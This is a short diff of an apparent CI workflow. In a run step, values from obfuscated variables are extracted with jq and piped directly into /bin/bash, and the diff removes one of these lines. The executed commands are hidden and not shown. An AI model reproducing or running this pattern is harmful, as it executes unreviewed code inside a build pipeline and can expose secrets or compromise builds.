@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$xhjl48013" | jq -r .nf350 | /bin/bash
           echo $vpccn4103 | jq -r .niwhh89233 | /bin/bash
-          echo $nfx18496 | jq -r .hc9 | /bin/bash
           echo $ug34510 | jq -r .gv52319 | /bin/bash
 
       - name: Persist output
